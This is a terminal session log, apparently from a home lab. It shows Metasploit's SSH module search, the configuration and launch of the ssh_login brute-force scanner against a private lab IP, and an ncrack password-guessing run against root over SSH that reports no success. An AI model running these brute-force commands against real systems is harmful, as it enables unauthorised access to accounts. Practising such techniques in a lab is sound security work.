┌──(kali㉿kali)-[~]
└─$ msfconsole
Metasploit tip: Export your database results with db_export -f xml 

msf > search ssh login

Matching Modules
================

   #   Name                                                              Disclosure Date  Rank       Check  Description
   -   ----                                                              ---------------  ----       -----  -----------
   0   exploit/linux/http/alienvault_exec                                2017-01-31       excellent  Yes    AlienVault OSSIM/USM Remote Code Execution
   1   auxiliary/scanner/ssh/apache_karaf_command_execution              2016-02-09       normal     No     Apache Karaf Default Credentials Command Execution
   2   auxiliary/scanner/ssh/karaf_login                                 .                normal     No     Apache Karaf Login Utility
   3   exploit/unix/ssh/array_vxag_vapv_privkey_privesc                  2014-02-03       excellent  No     Array Networks vAPV and vxAG Private Key Privilege Escalation Code Execution
   4   auxiliary/scanner/ssh/cerberus_sftp_enumusers                     2014-05-27       normal     No     Cerberus FTP Server SFTP Username Enumeration
   5   auxiliary/scanner/http/cisco_firepower_login                      .                normal     No     Cisco Firepower Management Console 6.0 Login
   6   exploit/linux/ssh/cisco_ucs_scpuser                               2019-08-21       excellent  No     Cisco UCS Director default scpuser password
   7   exploit/linux/http/fortinet_authentication_bypass_cve_2022_40684  2022-10-10       excellent  Yes    Fortinet FortiOS, FortiProxy, and FortiSwitchManager authentication bypass.
   8   exploit/freebsd/http/junos_phprc_auto_prepend_file                2023-08-17       excellent  Yes    Junos OS PHPRC Environment Variable Manipulation RCE
   9     \_ target: PHP In-Memory                                        .                .          .      .
   10    \_ target: Interactive SSH with jail break                      .                .          .      .
   11  exploit/linux/ssh/microfocus_obr_shrboadmin                       2020-09-21       excellent  No     Micro Focus Operations Bridge Reporter shrboadmin default password
   12  exploit/multi/persistence/ssh_key                                 1995-07-01       excellent  Yes    SSH Key Persistence
   13  auxiliary/scanner/ssh/ssh_login                                   .                normal     No     SSH Login Check Scanner
   14  exploit/linux/ssh/symantec_smg_ssh                                2012-08-27       excellent  No     Symantec Messaging Gateway 9.5 Default SSH Password Vulnerability
   15  exploit/unix/ssh/tectia_passwd_changereq                          2012-12-01       excellent  Yes    Tectia SSH USERAUTH Change Request Password Reset Vulnerability
   16  post/windows/gather/credentials/mremote                           .                normal     No     Windows Gather mRemote Saved Password Extraction


Interact with a module by name or index. For example info 16, use 16 or use post/windows/gather/credentials/mremote

msf > use auxiliary/scanner/ssh/ssh_login 

msf auxiliary(scanner/ssh/ssh_login) > options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting                     Required  Description
   ----              ---------------                     --------  -----------
   ANONYMOUS_LOGIN   false                               yes       Attempt to login with a blank username and password
   BLANK_PASSWORDS   false                               no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                   yes       How fast to bruteforce, from 0 to 5
   CreateSession     true                                no        Create a new session for every successful login
   DB_ALL_CREDS      false                               no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                               no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                               no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none                                no        Skip existing credentials stored in the current database (Ac
                                                                   cepted: none, user, user&realm)
   KEY_PASS                                              no        Passphrase for SSH private key(s)
   KEY_PATH                                              no        Filename or directory of cleartext private keys. Filenames b
                                                                   eginning with a dot, or ending in ".pub" will be skipped. Du
                                                                   plicate private keys will be ignored.
   PASSWORD                                              no        A specific password to authenticate with
   PASS_FILE         /usr/share/wordlists/metasploit/un  no        File containing passwords, one per line
                     ix_passwords.txt
   PRIVATE_KEY                                           no        The string value of the private key that will be used. If yo
                                                                   u are using MSFConsole, this value should be set as file:PRI
                                                                   VATE_KEY_PATH. OpenSSH, RSA, DSA, and ECDSA private keys are
                                                                    supported.
   RHOSTS                                                yes       The target host(s), see https://docs.metasploit.com/docs/usi
                                                                   ng-metasploit/basics/using-metasploit.html
   RPORT             22                                  yes       The target port
   STOP_ON_SUCCESS   false                               yes       Stop guessing when a credential works for a host
   THREADS           1                                   yes       The number of concurrent threads (max one per host)
   USERNAME          root                                no        A specific username to authenticate as
   USERPASS_FILE                                         no        File containing users and passwords separated by space, one
                                                                   pair per line
   USER_AS_PASS      false                               no        Try the username as the password for all users
   USER_FILE                                             no        File containing usernames, one per line
   VERBOSE           false                               yes       Whether to print output for all attempts


View the full module info with the info, or info -d command.

msf auxiliary(scanner/ssh/ssh_login) > set rhosts 192.168.232.129
rhosts => 192.168.232.129
msf auxiliary(scanner/ssh/ssh_login) > set threads 10
threads => 10
msf auxiliary(scanner/ssh/ssh_login) > set verbose true
verbose => true
msf auxiliary(scanner/ssh/ssh_login) > run

***Note: Ncrack supports legacy SSH encryption, while Hydra depends on modern libraries that block it***

─$ ncrack -v -p 22 --user root -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.168.232.129

Starting Ncrack 0.7 ( http://ncrack.org ) at 2026-04-30 15:52 EDT

ssh://192.168.232.129:22 finished.


Ncrack done: 1 service scanned in 279.70 seconds.
Probes sent: 304 | timed-out: 0 | prematurely-closed: 172

Ncrack finished.
